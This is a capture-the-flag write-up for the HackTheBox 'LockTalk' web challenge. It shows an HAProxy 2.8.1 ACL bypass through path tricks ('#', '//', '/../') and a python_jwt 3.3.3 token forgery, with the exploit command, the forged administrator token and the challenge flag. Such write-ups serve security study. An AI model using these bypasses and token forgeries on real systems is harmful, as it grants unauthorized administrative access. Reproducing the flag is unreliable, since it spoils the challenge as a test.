# LockTalk

Difficulty: <font color='orange'>Medium</font>

Category: web

## Description
>In "The Ransomware Dystopia," LockTalk emerges as a beacon of resistance against the rampant chaos inflicted by ransomware groups. In a world plunged into turmoil by malicious cyber threats, LockTalk stands as a formidable force, dedicated to protecting society from the insidious grip of ransomware. Chosen participants, tasked with representing their districts, navigate a perilous landscape fraught with ethical quandaries and treacherous challenges orchestrated by LockTalk. Their journey intertwines with the organization's mission to neutralize ransomware threats and restore order to a fractured world. As players confront internal struggles and external adversaries, their decisions shape the fate of not only themselves but also their fellow citizens, driving them to unravel the mysteries surrounding LockTalk and choose between succumbing to despair or standing resilient against the encroaching darkness.

## Strategy

To solve the challenge we took advantage of a vulnerability in haproxy version that allows us to **bypass a deny ACL via a path normalization issue** and get unauthorized access to the API as a user with the guest role. Then we proceed to find another vulnerability in the python_jwt library used for signing and verifying JWT tokens that allows us to **forge valid JWT tokens adding custom claims**. The latter allows us to forge a JWT token with the adeministrator role and get the flag.

## Enumeration

![](assets/webapp.png)

### Analyzing the source code

#### 1. haproxy version 2.8.1

The first thing we noticed is the version of haproxy that is referenced in the Dockerfile: 2.8.1. That version got my attention because of being vulnerable to CVE-2023-45539 as mentioned in [\[1\]](https://security.snyk.io/vuln/SNYK-DEBIAN10-HAPROXY-6091978) and [\[2\]](https://github.com/advisories/GHSA-79q7-m98p-qvhp).

![](assets/haproxy-version.png)

![](assets/cve-2023-45539.png)

We can see there is an ACL directive in haproxy.cfg file to deny the request for /api/v1/get_ticket:

```cfg
frontend haproxy
    bind 0.0.0.0:1337
    default_backend backend

    http-request deny if { path_beg,url_dec -i /api/v1/get_ticket }
```

#### 2. python_jtw version 3.3.3

Later on, reviewing the python dependencies we see python_jwt version 3.3.3 which is vulnerable to CVE-2022-39227, which allows to forge valid JWT tokens with modified claims keeping the original signature, as detailed in [\[1\]](https://pypi.org/project/python-jwt/) and [\[2\]](https://github.com/davedoesdev/python-jwt/security/advisories/GHSA-5p8v-58qm-c7fp).

![](assets/python_jwt.png)

![](assets/CVE-2022-39227.png)

#### 3. Elevated privileges to access /flag endpoint

The /flag endpoint is only authorized to be invoked by an administrator:

```
@api_blueprint.route('/flag', methods=['GET'])
@authorize_roles(['administrator'])
def flag():
    return jsonify({'message': current_app.config.get('FLAG')}), 200
```

## Exploitation

### 1. Getting a valid JWT via CVE-2023-45539

Attempting to access /api/v1/get_token directly gives us a 403 HTTP code.

![](assets/deny-rule.png)

We can **bypass that by adding a '#' at the end of the endpoint**: `/api/v1/get_token#`:

![](assets/bypass-haproxy-deny-rule.png)

Using Burp Json Web Tokens plugin we can see the role assigned: "guest".

![](assets/jwt-guest.png)

Reading other writeups it is interesting that there are at least two more different ways to get the same goal:
- perform a GET request to `//api/v1/get_token` as mentioned by [f0rest3xplorer](https://f0rest3xplorer.github.io/posts/locktalk/)
- perform a GET request to `/../api/v1/get_token` as mentioned by [Khanhhnahk1](https://hackmd.io/vlDnNWq5Qwair5d9y5nbWA?view#LockTalk)

There are also others that I tested like `/./api/v1/get_token` or specifying multiple ".." `/../../../../../../api/v1/get_ticket`:

![](assets/bypass-haproxy-2.png)
![](assets/bypass-haproxy-3.png)

### 2. Forging a valid JWT to elevate our privileges via CVE-2022-39227

With the guest JWT we cannot consume the `/flag` endpoint:

![](assets/flag-fail-guest.png)

I found this [repo](https://github.com/user0x1337/CVE-2022-39227/tree/main) in github that eases the forge JWT generation. We add the claim "role=administrator":

```bash
$ python3 cve_2022_39227.py -j "eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAxMDA5MTYsImlhdCI6MTcxMDA5NzMxNiwianRpIjoiQlcyb3gyQU95QWFIaXBWNm5wVWtKdyIsIm5iZiI6MTcxMDA5NzMxNiwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ.dntLt-l9Mu5rMSEzL8V6JmgYLo_p0hbhxpjiSiBy4Hom5XAtGCpJrzeonfN9mWKEqh8wj3mb2slxB6h3-OG3ET7YOR_RdZBUWPwhSRsenLZCo6aUxTM8d1wy-qe7WrBV-9YnCLrKQERO5AwtBdIjsL8Jj1tu2t3AYmbnDorp72616yRNNlLv9iXq9gnZHsBYHjhexA6zGIeqZmHddBnJCglVLi3Bnr9YfokUsh1bWnc1-xp3ERIEH-hO3YzyD1c8ESSiWPjuxapTuOXUyZNjC0nGUFjM9OTvNt5tWvMhaquekszY27j3O4rD0vB1bw1Me_Go3fv5kPASunswGR_rIw" -i "role=administrator"

[+] Retrieved base64 encoded payload: eyJleHAiOjE3MTAxMDA5MTYsImlhdCI6MTcxMDA5NzMxNiwianRpIjoiQlcyb3gyQU95QWFIaXBWNm5wVWtKdyIsIm5iZiI6MTcxMDA5NzMxNiwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ
[+] Decoded payload: {'exp': 1710100916, 'iat': 1710097316, 'jti': 'BW2ox2AOyAaHipV6npUkJw', 'nbf': 1710097316, 'role': 'guest', 'user': 'guest_user'}
[+] Inject new "fake" payload: {'exp': 1710100916, 'iat': 1710097316, 'jti': 'BW2ox2AOyAaHipV6npUkJw', 'nbf': 1710097316, 'role': 'administrator', 'user': 'guest_user'}
[+] Fake payload encoded: eyJleHAiOjE3MTAxMDA5MTYsImlhdCI6MTcxMDA5NzMxNiwianRpIjoiQlcyb3gyQU95QWFIaXBWNm5wVWtKdyIsIm5iZiI6MTcxMDA5NzMxNiwicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJ1c2VyIjoiZ3Vlc3RfdXNlciJ9

[+] New token:
 {"  eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAxMDA5MTYsImlhdCI6MTcxMDA5NzMxNiwianRpIjoiQlcyb3gyQU95QWFIaXBWNm5wVWtKdyIsIm5iZiI6MTcxMDA5NzMxNiwicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJ1c2VyIjoiZ3Vlc3RfdXNlciJ9.":"","protected":"eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9", "payload":"eyJleHAiOjE3MTAxMDA5MTYsImlhdCI6MTcxMDA5NzMxNiwianRpIjoiQlcyb3gyQU95QWFIaXBWNm5wVWtKdyIsIm5iZiI6MTcxMDA5NzMxNiwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ","signature":"dntLt-l9Mu5rMSEzL8V6JmgYLo_p0hbhxpjiSiBy4Hom5XAtGCpJrzeonfN9mWKEqh8wj3mb2slxB6h3-OG3ET7YOR_RdZBUWPwhSRsenLZCo6aUxTM8d1wy-qe7WrBV-9YnCLrKQERO5AwtBdIjsL8Jj1tu2t3AYmbnDorp72616yRNNlLv9iXq9gnZHsBYHjhexA6zGIeqZmHddBnJCglVLi3Bnr9YfokUsh1bWnc1-xp3ERIEH-hO3YzyD1c8ESSiWPjuxapTuOXUyZNjC0nGUFjM9OTvNt5tWvMhaquekszY27j3O4rD0vB1bw1Me_Go3fv5kPASunswGR_rIw"}

Example (HTTP-Cookie):
------------------------------
auth={"  eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAxMDA5MTYsImlhdCI6MTcxMDA5NzMxNiwianRpIjoiQlcyb3gyQU95QWFIaXBWNm5wVWtKdyIsIm5iZiI6MTcxMDA5NzMxNiwicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJ1c2VyIjoiZ3Vlc3RfdXNlciJ9.":"","protected":"eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9", "payload":"eyJleHAiOjE3MTAxMDA5MTYsImlhdCI6MTcxMDA5NzMxNiwianRpIjoiQlcyb3gyQU95QWFIaXBWNm5wVWtKdyIsIm5iZiI6MTcxMDA5NzMxNiwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ","signature":"dntLt-l9Mu5rMSEzL8V6JmgYLo_p0hbhxpjiSiBy4Hom5XAtGCpJrzeonfN9mWKEqh8wj3mb2slxB6h3-OG3ET7YOR_RdZBUWPwhSRsenLZCo6aUxTM8d1wy-qe7WrBV-9YnCLrKQERO5AwtBdIjsL8Jj1tu2t3AYmbnDorp72616yRNNlLv9iXq9gnZHsBYHjhexA6zGIeqZmHddBnJCglVLi3Bnr9YfokUsh1bWnc1-xp3ERIEH-hO3YzyD1c8ESSiWPjuxapTuOXUyZNjC0nGUFjM9OTvNt5tWvMhaquekszY27j3O4rD0vB1bw1Me_Go3fv5kPASunswGR_rIw"}
```

It is important to note this:

![](assets/forged-note.png)

### 3. Getting the flag

Using the forged JWT we get the flag: `HTB{h4Pr0Xy_n3v3r_D1s@pp01n4s}`

![](assets/flag.png)

![](assets/pwned.png)



